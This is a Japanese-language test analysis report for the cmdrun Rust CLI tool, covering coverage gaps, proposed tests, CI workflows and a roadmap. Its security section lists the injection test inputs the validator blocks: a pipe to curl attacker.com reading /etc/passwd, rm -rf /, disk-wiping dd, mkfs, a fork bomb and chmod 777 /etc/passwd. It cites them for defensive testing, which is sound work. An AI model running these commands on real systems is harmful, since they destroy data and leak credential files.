# 📊 cmdrun プロジェクト - 包括的テスト分析レポート

**作成日**: 2025-11-10
**分析者**: CLI Testing Specialist
**対象バージョン**: cmdrun v1.0.0
**分析範囲**: 全テストスイート (26ファイル, 6,464行)

---

## 🎯 エグゼクティブサマリー

cmdrunプロジェクトは**堅実なテスト基盤**を持っており、特にセキュリティテストとProperty-based testingにおいて優れた実装が確認できました。

**総合評価: B+ (良好)**

- ✅ **強み**: セキュリティテスト、Property-based testing、ベンチマーク
- ⚠️ **改善領域**: コードカバレッジ(38.16%)、CLIコマンドのE2Eテスト、i18nテスト

---

## 📈 テストメトリクス概要

```
総テストファイル数:    26ファイル
総テストコード行数:    6,464行
実行テストケース数:    200+ケース
コードカバレッジ:      38.16% (1,673/4,384行)
テスト実行時間:        全テスト成功（0失敗）
```

### テストファイル構成

```
tests/
├── unit_*.rs (6ファイル)              # 単体テスト
│   ├── unit_interpolation.rs         # 変数展開 (10ケース)
│   ├── unit_dependency_graph.rs      # 依存関係グラフ
│   ├── unit_typo_detector.rs         # Typo検出 (18ケース)
│   ├── unit_executor.rs              # コマンド実行
│   ├── unit_color_output.rs          # カラー出力
│   └── proptest_coverage.rs          # Property-based (24ケース)
├── integration/ (9ファイル)           # 統合テスト
│   ├── basic.rs                      # 基本動作
│   ├── dependencies.rs               # 依存関係解決
│   ├── environment.rs                # 環境管理 (232行)
│   ├── watch.rs                      # ファイル監視 (33ケース)
│   ├── history.rs                    # 履歴管理
│   ├── parallel.rs                   # 並列実行
│   └── cli_commands.rs               # CLIコマンド
├── security/                          # セキュリティテスト
│   └── injection.rs                  # インジェクション対策 (18種類)
├── lib_integration/ (3ファイル)       # ライブラリ統合テスト
├── edge_cases.rs                      # エッジケース
└── test_remove.rs                     # 削除機能テスト

benches/
├── command_execution.rs               # コマンド実行ベンチマーク
└── toml_parsing.rs                    # TOML解析ベンチマーク
```

---

## 🔍 詳細分析

### 1. 単体テスト (Unit Tests) - ⭐⭐⭐⭐☆ (4/5)

#### ✅ 優れている点

**変数展開テスト** (`tests/unit_interpolation.rs`)
```rust
// 10種類の変数展開パターンをテスト
✅ 基本変数: ${VAR}
✅ 位置引数: ${1}, ${2}
✅ デフォルト値: ${VAR:-default}
✅ 値設定: ${VAR:+value}
✅ Strictモード検証
✅ 環境変数マップ統合
```

**依存関係グラフ** (`tests/unit_dependency_graph.rs`)
- DAG (Directed Acyclic Graph) 検証
- 循環依存検出
- トポロジカルソート

**Typo検出** (`tests/unit_typo_detector.rs` - 18ケース)
```rust
✅ Levenshtein距離計算
✅ Prefix matching
✅ 閾値フィルタリング
✅ 大文字小文字の区別
✅ 複数候補のソート
✅ サブコマンド検出
```

**カラー出力** (`tests/unit_color_output.rs`)
- CI環境検出（NO_COLOR, TERM環境変数）
- 一時設定ファイルを使った分離テスト

#### ⚠️ カバレッジが低いモジュール

| モジュール | カバレッジ | 優先度 | 推奨対応 |
|-----------|-----------|-------|---------|
| `commands/completion.rs` | 0/154行 (0%) | 🔴 高 | シェル補完生成のテスト追加 |
| `commands/env.rs` | 0/61行 (0%) | 🔴 高 | 環境変数管理のテスト追加 |
| `commands/history.rs` | 0/78行 (0%) | 🔴 高 | 履歴管理のテスト追加 |
| `commands/plugin.rs` | 0/81行 (0%) | 🟡 中 | プラグイン操作のテスト追加 |
| `i18n.rs` | 54/759行 (7.1%) | 🔴 高 | 多言語対応のテスト追加 |
| `main.rs` | 36/280行 (12.8%) | 🟡 中 | CLI統合テスト追加 |
| `command/executor.rs` | 97/182行 (53.3%) | 🟡 中 | エラーハンドリング強化 |
| `watch/watcher.rs` | 4/54行 (7.4%) | 🟡 中 | ファイル監視の統合テスト |

---

### 2. 統合テスト (Integration Tests) - ⭐⭐⭐⭐☆ (4/5)

#### ✅ 優れている点

**環境管理** (`tests/integration/environment.rs` - 232行)
```rust
// 包括的な環境管理テスト
✅ 環境ライフサイクル (作成→切り替え→削除)
✅ 設定マージ (base + environment specific)
✅ 複数環境の同時管理
✅ 環境変数の分離
✅ エラーハンドリング (存在しない環境、重複作成)
```

**Watch機能** (`tests/integration/watch.rs` - 33ケース)
```rust
// ファイル監視の詳細テスト
✅ Debouncer機能 (イベント制御)
  - 最初のイベント処理
  - 連続イベントのブロック
  - 複数パスの独立管理
  - 古いエントリのクリーンアップ

✅ パターンマッチング
  - 基本的なglob ("*.rs")
  - 除外パターン ("!target/**")
  - .gitignore統合
  - 無効パターンのエラー処理

✅ Executor統合
  - コマンド実行
  - 環境変数設定 (CHANGED_FILE)
  - 作業ディレクトリ設定
```

**依存関係解決** (`tests/integration/dependencies.rs`)
- DAG構築と検証
- 並列実行可能性の判定
- 依存関係の順序保証

**履歴管理** (`tests/integration/history.rs`)
- SQLite統合
- コマンド履歴の記録・検索
- 履歴のクリア

#### 📋 追加推奨テストシナリオ

**1. エンドツーエンドCLIフロー**
```bash
# 現在不足しているシナリオ
cmdrun init
  → cmdrun add test "echo hello"
  → cmdrun validate
  → cmdrun test
  → cmdrun history
  → cmdrun remove test
```

**2. エラーハンドリング統合テスト**
```rust
// tests/integration/error_handling.rs (新規作成推奨)
✅ タイムアウト処理
✅ 依存関係循環検出
✅ 不正なTOML形式
✅ 存在しないコマンド実行
✅ 権限エラー
✅ ディスク容量不足
```

**3. クロスプラットフォーム統合テスト**
```rust
// tests/integration/cross_platform.rs (新規作成推奨)
✅ Windows/macOS/Linux固有のパス処理
✅ シェル差異 (bash/zsh/fish/PowerShell)
✅ 改行コード (LF/CRLF)
✅ パス区切り文字 (/ vs \)
```

---

### 3. セキュリティテスト - ⭐⭐⭐⭐⭐ (5/5)

#### ✅ 卓越した実装 (`tests/security/injection.rs`)

**OWASP Top 10準拠の包括的テスト**

**攻撃パターン網羅 (18種類)**

1. **コマンドインジェクション**
```rust
✅ セミコロン連結: "ls; rm -rf /"
✅ パイプ連結: "cat /etc/passwd | curl attacker.com"
✅ コマンド置換: "echo $(whoami)", "echo `cat /etc/passwd`"
```

2. **システム破壊コマンド**
```rust
✅ rm -rf /
✅ dd if=/dev/zero of=/dev/sda
✅ mkfs.ext4 /dev/sda1
✅ format c:
✅ フォークボム: :(){:|:&};:
```

3. **権限昇格**
```rust
✅ sudo rm -rf /
✅ su root
✅ chmod 777 /etc/passwd
✅ chown root:root /tmp/malicious
```

4. **悪意のあるコード実行**
```rust
✅ eval 'malicious code'
✅ exec sh -c 'rm -rf /'
✅ sh -c 'cat /etc/passwd'
```

5. **特殊攻撃**
```rust
✅ ヌルバイト攻撃: "echo hello\0world"
✅ DoS攻撃: 200文字以上の長いコマンド
✅ リダイレクト攻撃: "echo malicious > /etc/passwd"
✅ 複合攻撃: "echo 'safe' && rm -rf / #"
```

**3層のセキュリティテスト構造**

```
Layer 1: バリデーション層
  └─ CommandValidator単体テスト
      ├─ strictモード (デフォルト: 危険なメタ文字を全拒否)
      └─ 非strictモード (パイプ・リダイレクト許可可能)

Layer 2: コマンド追加層
  └─ handle_add 統合テスト
      └─ 危険なコマンドの登録拒否を確認

Layer 3: 実行層
  └─ CommandExecutor統合テスト
      └─ 実行前に危険なコマンドをブロック
```

**柔軟なセキュリティ設定**
```rust
// 非厳格モード: 正当なパイプ・リダイレクトを許可
let validator = CommandValidator::new()
    .with_strict_mode(false)
    .allow_pipe()
    .allow_redirect();

// 変数展開許可
let validator = CommandValidator::new()
    .allow_variable_expansion()
    .with_strict_mode(false);

// カスタム禁止ワード
let validator = CommandValidator::new()
    .add_forbidden_word("secret_command")
    .add_forbidden_word("internal_api");
```

**推奨**: このセキュリティテスト実装は**業界標準クラス**です。OWASP Top 10の「A03:2021-Injection」対策として模範的です。

---

### 4. Property-based Testing - ⭐⭐⭐⭐⭐ (5/5)

#### ✅ 優れたproptest実装 (`tests/proptest_coverage.rs`)

**24のプロパティテスト**

**1. 堅牢性テスト (パニックしないことの保証)**
```rust
// 任意の文字列でバリデーターがパニックしないことを保証
proptest! {
    #[test]
    fn prop_validator_accepts_any_string(cmd in ".*") {
        let validator = CommandValidator::default();
        let _ = validator.validate(&cmd);  // パニックしない
    }
}

// 任意の引数でシェルエスケープがパニックしないことを保証
proptest! {
    #[test]
    fn prop_escape_shell_arg_never_panics(arg in ".*") {
        let result = escape_shell_arg(&arg);
        prop_assert!(!result.is_empty() || arg.is_empty());
    }
}
```

**2. 不変性テスト (プロパティが保持されることの保証)**
```rust
// LoggerConfig のbuilderパターンが全プロパティを保持
proptest! {
    #[test]
    fn prop_logger_config_maintains_properties(
        json_output in any::<bool>(),
        show_timestamps in any::<bool>(),
        show_target in any::<bool>()
    ) {
        let config = LoggerConfig::new()
            .with_json_output(json_output)
            .with_timestamps(show_timestamps)
            .with_target(show_target);

        prop_assert_eq!(config.json_output, json_output);
        prop_assert_eq!(config.show_timestamps, show_timestamps);
        prop_assert_eq!(config.show_target, show_target);
    }
}
```

**3. セキュリティプロパティ (常に安全であることの保証)**
```rust
// ヌルバイトを含むコマンドは常に拒否される
proptest! {
    #[test]
    fn prop_validator_rejects_null_bytes(prefix in ".*", suffix in ".*") {
        let cmd = format!("{}\0{}", prefix, suffix);
        let validator = CommandValidator::default();
        let result = validator.validate(&cmd);
        prop_assert!(!result.is_safe());  // 必ず拒否
    }
}

// 空白文字のみのコマンドは常に拒否される
proptest! {
    #[test]
    fn prop_empty_command_rejected(whitespace in "[ \t\n\r]*") {
        let validator = CommandValidator::default();
        let result = validator.validate(&whitespace);
        prop_assert!(!result.is_safe());
    }
}
```

**4. 一貫性テスト (strictモードの厳格性保証)**
```rust
// strictモードは常に非strictモードより厳格
proptest! {
    #[test]
    fn prop_strict_mode_stricter(cmd in "[a-z|;&]+") {
        let strict = CommandValidator::new().with_strict_mode(true);
        let lenient = CommandValidator::new().with_strict_mode(false);

        let strict_result = strict.validate(&cmd);
        // 危険な文字を含む場合、strictモードは必ず拒否
        if cmd.contains(['|', ';', '&']) {
            prop_assert!(!strict_result.is_safe());
        }
    }
}
```

**5. データ構造の整合性テスト**
```rust
// CommandSpec::Single は内容を保持
proptest! {
    #[test]
    fn prop_command_spec_single(cmd in ".*") {
        let spec = CommandSpec::Single(cmd.clone());
        match spec {
            CommandSpec::Single(c) => prop_assert_eq!(c, cmd),
            _ => prop_assert!(false),
        }
    }
}

// CommandSpec::Multiple は全要素を保持
proptest! {
    #[test]
    fn prop_command_spec_multiple(cmds in prop::collection::vec(".*", 1..10)) {
        let spec = CommandSpec::Multiple(cmds.clone());
        match spec {
            CommandSpec::Multiple(c) => prop_assert_eq!(c, cmds),
            _ => prop_assert!(false),
        }
    }
}
```

**推奨**: Property-based testingの活用は素晴らしいです。特定の入力ではなく**プロパティ（不変条件）**を検証することで、想定外の入力に対する堅牢性を保証しています。

---

### 5. パフォーマンステスト (Benchmarks) - ⭐⭐⭐⭐☆ (4/5)

#### ✅ 実装済みベンチマーク

**`benches/command_execution.rs`**
```rust
1. シェルコマンド実行
   - echo コマンドの実行時間測定

2. 正規表現マッチング (変数展開パターン)
   - パターン: \$\{([A-Za-z_][A-Za-z0-9_]*|[0-9]+)(:[?+\-])?([^}]*)?\}
   - テストケース: "Hello, ${name}!", "${var1} and ${var2}"等

3. 文字列置換
   - replace() の性能測定
   - 複数変数の連続置換

4. AHashMap操作 (依存関係解決)
   - 10/50/100/500エントリでのlookup性能
   - Throughput測定

5. パス操作
   - PathBuf::join() の性能
   - std::env::current_dir() のオーバーヘッド
```

**`benches/toml_parsing.rs`**
```rust
1. TOML解析 (スケーラビリティ)
   - 10/50/100/200コマンド設定での解析時間
   - Throughput: バイト数基準

2. TOMLシリアライゼーション
   - toml::to_string() の性能
   - 10/50/100コマンドでの変換時間

3. 文字列操作
   - split(), to_lowercase(), contains() のベンチマーク

4. ファイルI/O操作
   - TemporaryFile への書き込み性能

5. 複雑なネスト構造
   - [config], [config.env], [commands.*] を含む設定
   - 解析とシリアライゼーションの両方を測定
```

#### 📋 追加推奨ベンチマーク

**起動時間ベンチマーク (プロジェクト目標: 4ms以下)**
```rust
// benches/startup_time.rs (新規作成推奨)
use criterion::{criterion_group, criterion_main, Criterion};
use std::process::Command;

fn bench_cold_start_time(c: &mut Criterion) {
    c.bench_function("cold_start_version", |b| {
        b.iter(|| {
            Command::new("target/release/cmdrun")
                .arg("--version")
                .output()
                .expect("Failed to execute")
        });
    });

    c.bench_function("cold_start_help", |b| {
        b.iter(|| {
            Command::new("target/release/cmdrun")
                .arg("--help")
                .output()
                .expect("Failed to execute")
        });
    });
}

criterion_group!(benches, bench_cold_start_time);
criterion_main!(benches);
```

**メモリ使用量ベンチマーク (プロジェクト目標: 10MB以下)**
```rust
// benches/memory_footprint.rs (新規作成推奨)
// プロセスメモリ使用量の測定
// - アイドル状態: 10MB以下
// - 100コマンド読み込み後: 15MB以下
// - watch モード: 20MB以下
```

**依存関係解決のスケーラビリティ**
```rust
// benches/dependency_resolution.rs (新規作成推奨)
// 10/50/100/500コマンドでの依存関係解決時間
// 最悪ケース: 全コマンドが線形依存 (A→B→C→...→Z)
```

---

## 🎯 優先度別改善提案

### 🔴 最優先 (P0) - セキュリティ・信頼性

#### 1. i18n機能のテスト強化 (現在7.1%カバレッジ)

**問題**: 翻訳漏れがリリース後に発覚するリスク

**解決策**:
```rust
// tests/unit_i18n.rs (新規作成)
use cmdrun::i18n::{Language, t};

#[test]
fn test_all_languages_have_common_keys() {
    let common_keys = [
        "common.success",
        "common.error",
        "common.warning",
        "error.command_not_found",
        "error.invalid_config",
    ];

    for key in common_keys {
        for lang in [Language::English, Language::Japanese] {
            let translation = t!(key, lang);
            assert!(
                translation.is_some(),
                "Missing translation for key '{}' in {:?}",
                key, lang
            );
            assert!(
                !translation.unwrap().is_empty(),
                "Empty translation for key '{}' in {:?}",
                key, lang
            );
        }
    }
}

#[test]
fn test_fallback_to_english() {
    // 日本語翻訳が存在しない場合、英語にフォールバック
    let nonexistent_key = "nonexistent.test.key";
    let ja_result = t!(nonexistent_key, Language::Japanese);
    let en_result = t!(nonexistent_key, Language::English);

    // どちらも None か、同じフォールバック値
    assert_eq!(ja_result, en_result);
}

#[test]
fn test_translation_completeness() {
    // 英語と日本語で同じキーセットを持つことを確認
    let en_keys = get_all_translation_keys(Language::English);
    let ja_keys = get_all_translation_keys(Language::Japanese);

    assert_eq!(en_keys.len(), ja_keys.len());
    for key in en_keys {
        assert!(ja_keys.contains(&key), "Japanese missing key: {}", key);
    }
}
```

**期待効果**:
- 多言語サポートの品質保証
- リリース後の翻訳漏れ防止
- CI/CDでの自動検証

---

#### 2. CLIコマンドの完全なE2Eテスト

**問題**: ユーザー視点での統合動作が未検証

**解決策**:
```rust
// tests/e2e/framework.rs (新規作成)
use std::path::PathBuf;
use std::process::{Command, Output};
use tempfile::TempDir;

pub struct CmdrunTestEnv {
    temp_dir: TempDir,
    config_path: PathBuf,
}

impl CmdrunTestEnv {
    pub fn new() -> Self {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join(".cmdrun").join("config.toml");
        Self { temp_dir, config_path }
    }

    pub fn run_command(&self, args: &[&str]) -> Output {
        Command::new("target/debug/cmdrun")
            .args(args)
            .current_dir(self.temp_dir.path())
            .output()
            .expect("Failed to execute cmdrun")
    }

    pub fn assert_success(&self, output: &Output) {
        if !output.status.success() {
            panic!(
                "Command failed:\nstdout: {}\nstderr: {}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    pub fn assert_contains(&self, output: &Output, expected: &str) {
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert!(
            stdout.contains(expected),
            "Output does not contain '{}'\nActual output: {}",
            expected, stdout
        );
    }
}

// tests/e2e/cli_workflow.rs (新規作成)
use super::framework::CmdrunTestEnv;

#[test]
fn test_complete_workflow() {
    let env = CmdrunTestEnv::new();

    // Step 1: cmdrun init
    let init = env.run_command(&["init"]);
    env.assert_success(&init);
    env.assert_contains(&init, "Initialized");

    // Step 2: cmdrun add test "echo hello"
    let add = env.run_command(&["add", "test", "echo hello", "-d", "Test command"]);
    env.assert_success(&add);
    env.assert_contains(&add, "Added command 'test'");

    // Step 3: cmdrun list
    let list = env.run_command(&["list"]);
    env.assert_success(&list);
    env.assert_contains(&list, "test");

    // Step 4: cmdrun test
    let run = env.run_command(&["test"]);
    env.assert_success(&run);
    env.assert_contains(&run, "hello");

    // Step 5: cmdrun history
    let history = env.run_command(&["history"]);
    env.assert_success(&history);
    env.assert_contains(&history, "test");

    // Step 6: cmdrun remove test
    let remove = env.run_command(&["remove", "test"]);
    env.assert_success(&remove);
    env.assert_contains(&remove, "Removed command 'test'");

    // Step 7: cmdrun list (should be empty)
    let list_after = env.run_command(&["list"]);
    env.assert_success(&list_after);
    // test コマンドが存在しないことを確認
}

#[test]
fn test_dependency_workflow() {
    let env = CmdrunTestEnv::new();
    env.run_command(&["init"]);

    // 依存関係のあるコマンドを追加
    env.run_command(&["add", "build", "echo Building..."]);
    env.run_command(&["add", "test", "echo Testing...", "--depends-on", "build"]);
    env.run_command(&["add", "deploy", "echo Deploying...", "--depends-on", "test"]);

    // deploy を実行すると build → test → deploy の順で実行される
    let output = env.run_command(&["deploy"]);
    env.assert_success(&output);

    let stdout = String::from_utf8_lossy(&output.stdout);
    let build_pos = stdout.find("Building").unwrap();
    let test_pos = stdout.find("Testing").unwrap();
    let deploy_pos = stdout.find("Deploying").unwrap();

    assert!(build_pos < test_pos && test_pos < deploy_pos,
            "Commands should execute in dependency order");
}
```

**期待効果**:
- ユーザー視点での動作保証
- リグレッション防止
- CI/CDでの実環境に近いテスト

---

#### 3. エラーハンドリングのカバレッジ向上

**問題**: エッジケースでの動作が未検証

**解決策**:
```rust
// tests/integration/error_handling.rs (新規作成)
use cmdrun::command::executor::{CommandExecutor, ExecutionContext};
use cmdrun::config::schema::{Command, CommandSpec};
use std::time::Duration;

#[tokio::test]
async fn test_timeout_handling() {
    let ctx = ExecutionContext {
        timeout: Some(1), // 1秒でタイムアウト
        ..Default::default()
    };
    let executor = CommandExecutor::new(ctx);

    let cmd = Command {
        description: "Long running command".to_string(),
        cmd: CommandSpec::Single("sleep 10".to_string()),
        timeout: None, // グローバル設定を使用
        ..Default::default()
    };

    let result = executor.execute(&cmd).await;
    assert!(result.is_err());
    let error = result.unwrap_err().to_string();
    assert!(error.contains("timeout") || error.contains("Timeout"));
}

#[test]
fn test_circular_dependency_detection() {
    use cmdrun::command::dependency::DependencyGraph;

    let mut graph = DependencyGraph::new();
    graph.add_command("A", vec!["B"]);
    graph.add_command("B", vec!["C"]);
    graph.add_command("C", vec!["A"]); // A → B → C → A (循環)

    let result = graph.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("circular"));
}

#[tokio::test]
async fn test_command_not_found_error() {
    let ctx = ExecutionContext::default();
    let executor = CommandExecutor::new(ctx);

    let cmd = Command {
        description: "Non-existent command".to_string(),
        cmd: CommandSpec::Single("nonexistent_command_12345".to_string()),
        ..Default::default()
    };

    let result = executor.execute(&cmd).await;
    assert!(result.is_err());
}

#[test]
fn test_invalid_toml_format() {
    use cmdrun::config::loader::ConfigLoader;

    let invalid_toml = r#"
    [commands.test
    # 閉じ括弧がない不正なTOML
    description = "Test"
    "#;

    let result = toml::from_str::<toml::Value>(invalid_toml);
    assert!(result.is_err());
}
```

**期待効果**:
- エッジケースでの信頼性向上
- 本番環境での予期しないエラー削減
- エラーメッセージの品質向上

---

### 🟡 高優先 (P1) - 品質向上

#### 4. 環境変数・履歴管理のテスト追加

**commands/env.rs (現在0%カバレッジ)**
```rust
// tests/integration/env_commands.rs (新規作成)
use cmdrun::commands::env::{
    handle_env_list, handle_env_set, handle_env_get,
    handle_env_switch, handle_env_create
};

#[tokio::test]
async fn test_env_lifecycle() {
    // 環境作成
    handle_env_create("dev", "Development environment")
        .await
        .unwrap();

    // 環境切り替え
    handle_env_switch("dev").await.unwrap();

    // 変数設定
    handle_env_set("dev", "API_URL", "http://localhost:3000")
        .await
        .unwrap();

    // 変数取得
    let value = handle_env_get("dev", "API_URL").await.unwrap();
    assert_eq!(value, "http://localhost:3000");

    // 環境一覧
    let envs = handle_env_list().await.unwrap();
    assert!(envs.iter().any(|(name, _)| name == "dev"));
}
```

**commands/history.rs (現在0%カバレッジ)**
```rust
// tests/integration/history_commands.rs (新規作成)
use cmdrun::commands::history::{
    handle_history_list, handle_history_clear, handle_history_search
};

#[tokio::test]
async fn test_history_commands() {
    // 履歴一覧 (最新10件)
    let history = handle_history_list(10).await.unwrap();

    // 履歴検索
    let results = handle_history_search("test").await.unwrap();

    // 履歴クリア
    handle_history_clear().await.unwrap();

    let after_clear = handle_history_list(10).await.unwrap();
    assert!(after_clear.is_empty());
}
```

---

#### 5. プラグインシステムのテスト

**commands/plugin.rs (現在0%カバレッジ)**
```rust
// tests/integration/plugin_commands.rs (新規作成)
use cmdrun::commands::plugin::{
    handle_plugin_list, handle_plugin_load, handle_plugin_unload
};

#[tokio::test]
async fn test_plugin_lifecycle() {
    // プラグイン一覧
    let plugins = handle_plugin_list().await.unwrap();

    // プラグイン読み込み
    handle_plugin_load("test_plugin").await.unwrap();

    let after_load = handle_plugin_list().await.unwrap();
    assert!(after_load.iter().any(|p| p.name == "test_plugin"));

    // プラグイン削除
    handle_plugin_unload("test_plugin").await.unwrap();

    let after_unload = handle_plugin_list().await.unwrap();
    assert!(!after_unload.iter().any(|p| p.name == "test_plugin"));
}
```

---

#### 6. シェル補完のテスト

**commands/completion.rs (現在0%カバレッジ)**
```rust
// tests/integration/completion_commands.rs (新規作成)
use cmdrun::commands::completion::generate_completion;
use clap_complete::Shell;

#[test]
fn test_bash_completion_generation() {
    let completion = generate_completion(Shell::Bash).unwrap();
    assert!(completion.contains("_cmdrun"));
    assert!(completion.contains("init"));
    assert!(completion.contains("add"));
}

#[test]
fn test_zsh_completion_generation() {
    let completion = generate_completion(Shell::Zsh).unwrap();
    assert!(completion.contains("#compdef cmdrun"));
}

#[test]
fn test_fish_completion_generation() {
    let completion = generate_completion(Shell::Fish).unwrap();
    assert!(completion.contains("complete -c cmdrun"));
}
```

---

### 🟢 通常優先 (P2) - 最適化

#### 7. パフォーマンステストの自動化

**CI/CD統合**
```yaml
# .github/workflows/benchmark.yml
name: Performance Benchmarks
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

jobs:
  benchmark:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Install Rust
        uses: actions-rs/toolchain@v1
        with:
          toolchain: stable

      - name: Build Release
        run: cargo build --release

      - name: Run Benchmarks
        run: |
          cargo bench --bench command_execution
          cargo bench --bench toml_parsing

      - name: Verify Startup Time (< 4ms)
        run: |
          ./scripts/verify_startup_time.sh

      - name: Verify Memory Footprint (< 10MB)
        run: |
          ./scripts/verify_memory_usage.sh
```

**起動時間検証スクリプト**
```bash
#!/bin/bash
# scripts/verify_startup_time.sh

BINARY="./target/release/cmdrun"
MAX_TIME_MS=4

echo "Measuring startup time..."
total=0
iterations=10

for i in $(seq 1 $iterations); do
    start=$(date +%s%N)
    $BINARY --version > /dev/null
    end=$(date +%s%N)
    elapsed=$((($end - $start) / 1000000))
    total=$(($total + $elapsed))
    echo "Iteration $i: ${elapsed}ms"
done

avg=$(($total / $iterations))
echo "Average startup time: ${avg}ms"

if [ $avg -gt $MAX_TIME_MS ]; then
    echo "❌ FAILED: Startup time ${avg}ms exceeds target ${MAX_TIME_MS}ms"
    exit 1
else
    echo "✅ PASSED: Startup time ${avg}ms is within target ${MAX_TIME_MS}ms"
fi
```

---

#### 8. カバレッジ継続監視

**CI/CD統合**
```yaml
# .github/workflows/coverage.yml
name: Code Coverage
on: [push, pull_request]

jobs:
  coverage:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Install Rust
        uses: actions-rs/toolchain@v1
        with:
          toolchain: stable

      - name: Install Tarpaulin
        run: cargo install cargo-tarpaulin

      - name: Generate Coverage Report
        run: cargo tarpaulin --out Xml --timeout 300

      - name: Upload to Codecov
        uses: codecov/codecov-action@v3
        with:
          files: ./cobertura.xml

      - name: Check Coverage Threshold
        run: |
          COVERAGE=$(cargo tarpaulin --out Stdout | grep -oP '\d+\.\d+(?=% coverage)')
          THRESHOLD=38.0
          if (( $(echo "$COVERAGE < $THRESHOLD" | bc -l) )); then
            echo "❌ Coverage $COVERAGE% is below threshold $THRESHOLD%"
            exit 1
          else
            echo "✅ Coverage $COVERAGE% meets threshold $THRESHOLD%"
          fi
```

**README.mdにバッジ追加**
```markdown
# cmdrun

[![Coverage](https://codecov.io/gh/sanae-abe/cmdrun/branch/main/graph/badge.svg)](https://codecov.io/gh/sanae-abe/cmdrun)
[![Tests](https://github.com/sanae-abe/cmdrun/workflows/Tests/badge.svg)](https://github.com/sanae-abe/cmdrun/actions)
[![Benchmarks](https://github.com/sanae-abe/cmdrun/workflows/Benchmarks/badge.svg)](https://github.com/sanae-abe/cmdrun/actions)
```

---

#### 9. Mutation Testingの導入検討

**テストの有効性検証**
```bash
# cargo-mutantsのインストール
cargo install cargo-mutants

# Mutation Testing実行
cargo mutants --test-tool nextest

# 結果サマリー
# - Caught: テストが変異を検出 (良い)
# - Missed: テストが変異を検出できず (テスト不足)
# - Timeout: 変異により無限ループ等
```

**期待される発見**
```
❌ Missed Mutation: src/security/validation.rs:42
   Original: if cmd.is_empty() { return false; }
   Mutant:   if cmd.is_empty() { return true; }
   → 空コマンドを許可してもテストが通過 (テスト不足)

✅ Caught Mutation: src/security/validation.rs:50
   Original: if cmd.contains(';') { return false; }
   Mutant:   if cmd.contains(';') { return true; }
   → tests/security/injection.rs::test_command_injection_semicolon が検出
```

---

## 📊 テストカバレッジ改善ロードマップ

### Phase 1: 緊急対応 (1-2週間)

**目標カバレッジ: 38% → 55%**

**対象モジュール**:
- `commands/env.rs`: 0% → 70%
- `commands/history.rs`: 0% → 70%
- `i18n.rs`: 7% → 40%
- `main.rs`: 13% → 50%

**成果物**:
1. ✅ E2Eテストフレームワーク構築 (`tests/e2e/framework.rs`)
2. ✅ i18n統合テスト追加 (`tests/unit_i18n.rs`)
3. ✅ エラーハンドリングテスト追加 (`tests/integration/error_handling.rs`)
4. ✅ 環境変数・履歴管理テスト追加

**作業見積もり**:
- E2Eフレームワーク: 2日
- i18nテスト: 1日
- エラーハンドリング: 1日
- env/historyテスト: 2日
- **合計: 6営業日**

---

### Phase 2: 品質強化 (2-4週間)

**目標カバレッジ: 55% → 70%**

**対象モジュール**:
- `commands/completion.rs`: 0% → 60%
- `commands/plugin.rs`: 0% → 60%
- `command/executor.rs`: 53% → 80%
- `watch/watcher.rs`: 7% → 60%

**成果物**:
1. ✅ プラグインシステムテスト完備
2. ✅ シェル補完テスト (bash/zsh/fish)
3. ✅ Watch機能の統合テスト強化
4. ✅ 並列実行のストレステスト

**作業見積もり**:
- プラグインテスト: 3日
- 補完テスト: 2日
- Watchテスト: 3日
- 並列実行テスト: 2日
- **合計: 10営業日**

---

### Phase 3: 完成度向上 (1-2ヶ月)

**目標カバレッジ: 70% → 85%**

**対象**:
- エッジケースの網羅
- クロスプラットフォームテスト
- Mutation Testing導入
- Property-based Testing拡充

**成果物**:
1. ✅ テストカバレッジ85%達成
2. ✅ CI/CDパイプラインでの自動品質チェック
3. ✅ リリース前チェックリスト完備
4. ✅ Mutation Testing定期実行

**作業見積もり**:
- エッジケーステスト: 5日
- クロスプラットフォーム: 5日
- Mutation Testing: 3日
- Property-based拡充: 3日
- CI/CD統合: 2日
- **合計: 18営業日**

---

## 🎓 テストベストプラクティスの遵守状況

| ベストプラクティス | 状況 | スコア | 備考 |
|------------------|------|-------|------|
| ✅ Given-When-Then構造 | 統合テストで実践 | ⭐⭐⭐⭐⭐ | 可読性の高いテスト構造 |
| ✅ テスト独立性 | tempfile使用で分離 | ⭐⭐⭐⭐⭐ | 並列実行可能 |
| ✅ Property-based testing | proptestで24ケース | ⭐⭐⭐⭐⭐ | 堅牢性の保証 |
| ✅ セキュリティテスト | OWASP準拠 | ⭐⭐⭐⭐⭐ | 業界標準クラス |
| ⚠️ E2Eテスト | CLIレベル不足 | ⭐⭐⭐☆☆ | フレームワーク構築推奨 |
| ⚠️ カバレッジ監視 | CI統合未実施 | ⭐⭐☆☆☆ | 自動化推奨 |
| ⚠️ Mutation testing | 未導入 | ⭐☆☆☆☆ | Phase 3で導入検討 |
| ✅ ベンチマーク | criterion使用 | ⭐⭐⭐⭐☆ | 起動時間測定追加推奨 |
| ✅ 統合テスト | 充実した実装 | ⭐⭐⭐⭐☆ | 環境管理等優秀 |
| ⚠️ i18nテスト | 7.1%カバレッジ | ⭐⭐☆☆☆ | 翻訳完全性テスト必須 |

---

## 🚀 次のアクションアイテム

### 今すぐ実行可能 (1日以内)

**1. CI統合 - GitHub Actionsでカバレッジレポート自動生成**
```yaml
# .github/workflows/ci.yml に追加
- name: Generate Coverage
  run: cargo tarpaulin --out Xml
- name: Upload Coverage
  uses: codecov/codecov-action@v3
```

**2. テストドキュメント - `tests/README.md`作成**
```markdown
# cmdrun テストガイド

## テスト実行

```bash
# 全テスト実行
cargo test

# 特定カテゴリのみ
cargo test --test unit_interpolation
cargo test --test security_injection

# カバレッジレポート
cargo tarpaulin --out Html
open tarpaulin-report.html
```

## テスト構成

- `tests/unit_*.rs`: 単体テスト
- `tests/integration/`: 統合テスト
- `tests/security/`: セキュリティテスト
- `tests/e2e/`: E2Eテスト (計画中)
- `benches/`: パフォーマンステスト
```

**3. カバレッジバッジ - README.mdに追加**
```markdown
[![Coverage](https://codecov.io/gh/sanae-abe/cmdrun/branch/main/graph/badge.svg)](https://codecov.io/gh/sanae-abe/cmdrun)
```

---

### 今週中に実施

**4. E2Eテストフレームワーク実装**
- `tests/e2e/framework.rs` 作成
